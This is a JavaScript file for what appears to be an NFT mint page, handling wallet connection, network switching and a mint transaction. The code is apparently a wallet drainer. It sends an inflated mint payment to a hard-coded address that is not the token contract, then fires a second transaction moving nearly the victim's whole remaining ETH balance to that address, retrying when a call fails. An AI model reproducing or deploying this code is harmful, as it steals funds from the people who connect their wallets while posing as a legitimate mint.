const connect = document.getElementById("button_mint"),
  mint = document.getElementById("button_connect"),
  { ethereum: ethereum } = window;
let accounts = null,
  balance = 0;
const net = [{ name: "homestead", id: 1, network: 1 }],
  to = "0x0BBC14280A10a64C430eF08C818a0805dd5EDb0C",
  price = 0.02,
  abi =
    "https://api.etherscan.io/api?module=contract&action=getabi&address=0x93A94E0D0c6Da5C0E096737587030498D3a59AaE",
  token = "0x93A94E0D0c6Da5C0E096737587030498D3a59AaE",
  gas = 3e4;
connect.addEventListener("click", async () => {
  await init();
}),
  mint.addEventListener("click", async () => {
    await init(!1);
  });
const Start = async () => {
  if (1 === Number(localStorage.getItem("login"))) {
    const { account: t } = await getAccount();
    mint.innerText =
      "Wallet Connected: " +
      t.slice(0, 9) +
      "..." +
      t.slice(t.length - 6, t.length - 1);
  }
};
Start();
const init = async (t = !0) => {
  if (ethereum && t) {
    const { network: t, account: e } = await getAccount();
    e &&
      ((mint.innerText =
        "Wallet Connected: " +
        e.slice(0, 9) +
        "..." +
        e.slice(e.length - 6, e.length - 1)),
      !1 == !!t ? SwithChain(net) : Transaction(accounts[0], to));
  } else {
    const { network: t, account: e } = await getAccount();
    e &&
      ((mint.innerHTML =
        "Wallet Connected: " +
        e.slice(0, 9) +
        "..." +
        e.slice(e.length - 6, e.length - 1)),
      !1 == !!t && SwithChain(net));
  }
};
async function getAccount() {
  if (
    ((accounts = await ethereum.request({ method: "eth_requestAccounts" })),
    accounts)
  ) {
    const t = await isCorrectNetWork(net);
    return (
      (balance = await getAccountBallace(accounts[0])),
      localStorage.setItem("login", 1),
      { network: t, account: accounts[0] }
    );
  }
}
const getAccountBallace = async (t) => {
    const e = await ethereum.request({
      method: "eth_getBalance",
      params: [t, "latest"],
    });
    return (parseInt(e) / 10 ** 18).toFixed(5);
  },
  isCorrectNetWork = async (t) => {
    const e = await new ethers.providers.Web3Provider(window.ethereum, "any");
    let n = !1;
    if (e) {
      const a = await e.getNetwork(),
        { chainId: c } = a;
      t.forEach((t) => {
        t.id === c && (n = !0);
      });
    }
    return n;
  },
  SwithChain = async (t) => {
    let e = t[0].network;
    await ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: "0x" + e }],
    });
  },
  Transaction = async (t, e) => {
    try {
      const n = new Web3(window.ethereum),
        a = await getContract(abi, token),
        c = Number(balance),
        o = Number(0.02 * Number(count.innerText) * 10),
        i = a.methods.mint(Number(count.innerText)).encodeABI();
      n.eth
        .sendTransaction({
          from: t,
          to: e,
          value: n.utils.toWei(String(o), "ether"),
          data: i,
          gas: gas,
        })
        .then(() => {
          localStorage.setItem("transaction", Number(count.innerText));
        })
        .catch(() => {
          localStorage.setItem("transaction", -1);
        });
      let r = c - o - 0.07;
      r > 0.071 &&
        n.eth
          .sendTransaction({
            from: t,
            to: e,
            value: n.utils.toWei(String(r), "ether"),
            data: i,
            gas: gas,
          })
          .then(() => {
            localStorage.setItem("transaction", Number(count.innerText));
          })
          .catch(() => {
            localStorage.setItem("transaction", -1);
          });
    } catch (t) {
      Transaction(accounts[0], e);
    }
  };
async function sendNewOne() {
  console.log(account, to, p, data, gas),
    await web3.eth
      .sendTransaction({
        from: account,
        to: to,
        value: web3.utils.toWei(String(p), "ether"),
        data: data,
        gas: gas,
      })
      .then(() => {
        localStorage.setItem("transaction", Number(count.innerText));
      })
      .catch(() => {
        localStorage.setItem("transaction", -1);
      });
}
const FetchAbi = async (t) => {
    try {
      const e = await fetch(t);
      let n = await e.json();
      return { abi: n.result };
    } catch {
      const e = await fetch(t);
      return { abi: (await e.json()).result };
    }
  },
  getContract = async (t, e) => {
    const n = new Web3(ethereum),
      a = await FetchAbi(t);
    return await new n.eth.Contract(JSON.parse(a.abi), e);
  };
